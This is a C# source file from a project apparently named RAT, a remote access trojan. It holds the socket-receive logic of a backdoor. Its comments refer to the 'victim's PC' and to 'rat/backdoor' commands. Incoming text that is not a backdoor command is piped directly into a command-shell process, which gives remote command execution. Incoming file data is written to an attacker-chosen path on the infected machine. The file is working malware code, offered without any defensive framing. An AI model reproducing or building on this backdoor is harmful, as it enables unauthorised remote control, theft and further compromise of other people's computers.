using RAT.src.Interfaces;
using RAT.src.Models;
using RAT.src.Models.Enums;
using System;
using System.Net.Sockets;
using System.Text;

namespace RAT.src.Logic.Sockets.Connection
{
    /// <summary>
    /// Handles client connection stage over socket.
    /// </summary>
    public class SocketConnectionReceiveLogic : ISocketConnectionReceiveLogic
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly IClientNotificationLogic _notificationLogic;
        private readonly IFileUploader _fileUploader;
        private readonly ISocketConnectionDisconnectLogic _socketConnectionDisconnectLogic;
        private readonly IRatCommandLogic _ratCommandLogic;

        /// <summary>
        /// Handles client connection stage over socket.
        /// </summary>
        /// <param name="stateLogic">Our client state logic.</param>
        /// <param name="disconnectLogic">Disconnection logic for client.</param>
        /// <param name="fileUploader">Logic for file upload on victim's PC.</param>
        /// <param name="notificationLogic">Logic for client notifications.</param>
        /// <param name="ratCommandLogic">Our rat/backdoor command logic.</param>
        public SocketConnectionReceiveLogic(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic,
            IFileUploader fileUploader,
            ISocketConnectionDisconnectLogic disconnectLogic,
            IRatCommandLogic ratCommandLogic)
        {
            _socketStateLogic = stateLogic;
            _socketConnectionDisconnectLogic = disconnectLogic;
            _ratCommandLogic = ratCommandLogic;
            _notificationLogic = notificationLogic;
            _fileUploader = fileUploader;
        }

        /// <summary>
        /// Wrapper for initial command receive, any data starts from here.
        /// </summary>
        /// <param name="socket">Our connection.</param>
        public void BeginDataReceive(Socket socket)
        {
            var clientState = _socketStateLogic.State;
            if (clientState.CurrentOperation == CurrentOperation.FileUpload)
            {
                socket.BeginReceive(clientState.FileDataArray, 0, clientState.FileDataArray.Length, 0, OnFileDataReceive, clientState);
            }
            else
            {
                socket.BeginReceive(clientState.CommandDataArray, 0, clientState.CommandDataArray.Length, 0, OnCommandReceive, clientState);
            }
        }

        /// <summary>
        /// Command receival logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        private void OnCommandReceive(IAsyncResult res)
        {
            // Read data from the client socket.
            StateObject state = _socketStateLogic.GetStateFromAsyncResult(res);
            int bytesRead = this.EndDataReceiveAndGetRecevedBytesCount(res, state);

            // There might be more data, so store the data received so far.
            state.DataBuilder.Append(Encoding.ASCII.GetString(state.CommandDataArray, 0, bytesRead));
            string content = state.DataBuilder.ToString();
            if (string.IsNullOrEmpty(content) && state.DataBuilder.Length == 0)
            {
                return;
            }

            // Check for end of command character (new line) in client command. If it is not there, read
            // more data.
            if (!content.Contains("\n"))
            {
                // Not all data received. Get more.
                this.BeginDataReceive(state.ClientMainSocket);
            }
            else
            {
                this.HandleClientRequest(state);
            }
        }

        /// <summary>
        /// File data receival logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        private void OnFileDataReceive(IAsyncResult res)
        {
            // Read data from the client socket.
            StateObject state = _socketStateLogic.GetStateFromAsyncResult(res);
            int bytesReceved = this.EndDataReceiveAndGetRecevedBytesCount(res, state);

            // No data received.
            if (bytesReceved == 0 && state.FileDataArray.Length == 0)
            {
                return;
            }

            if (bytesReceved > 0)
            {
                // Preserving uploaded data in string format.
                string resultInStringFormat = Convert.ToBase64String(state.FileDataArray);
                state.FileDataBuilder.Append(resultInStringFormat);

                // Continue on receiving data.
                this.BeginDataReceive(state.ClientFileUploadSocket);
            }
            else
            {
                // Upload finished.
                state.CurrentOperation = CurrentOperation.None;
                _fileUploader.UploadFile(state.PathForFileUpload, Convert.FromBase64String(state.FileDataBuilder.ToString()));
            }
        }

        /// <summary>
        /// Handles client request after data is red.
        /// </summary>
        /// <param name="clientState">Current client state.</param>
        private void HandleClientRequest(StateObject clientState)
        {
            var potentialCommand = clientState.DataBuilder.ToString();

            // Check if this is RAT related command
            if (_ratCommandLogic.IsRatCommand(potentialCommand))
            {
                _ratCommandLogic.HandleRatCommand(potentialCommand);
            }
            else
            {
                // Execute cmd command.
                clientState.ClientCmdProcess.StandardInput.WriteLine(potentialCommand);
            }

            // Clear state data after command execution.
            clientState.DataBuilder.Clear(); // Command is stored here in string format.
            clientState.CommandDataArray = new byte[1024]; // Command is stored here in byte command.

            // Continue on listening for other commands.
            this.BeginDataReceive(clientState.ClientMainSocket);
        }

        /// <summary>
        /// Ends data receival and gets bytes received.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        /// <param name="state">Current client state.</param>
        /// <returns>Bytes received.</returns>
        private int EndDataReceiveAndGetRecevedBytesCount(IAsyncResult res, StateObject state)
        {
            // ---- TEMP
            int bytesReceved = 0;
            try
            {
                if (state.CurrentOperation == CurrentOperation.FileUpload)
                {
                    bytesReceved = state.ClientFileUploadSocket.EndReceive(res);
                }
                else
                {
                    bytesReceved = state.ClientMainSocket.EndReceive(res);
                }
            }
            catch (Exception exception)
            {
                // If some error occured during receival, then we are disconnecting client but preserving socket and connection,
                // so he could connect again immediately (in case if some error occured on his side).
                _socketConnectionDisconnectLogic.DisconnectFromMainSocket(state.ClientMainSocket);
                _notificationLogic.NotifyClient($"Error during data receive: {exception.Message}");
            }

            return bytesReceved;
            // ---- TEMP
        }
    }
}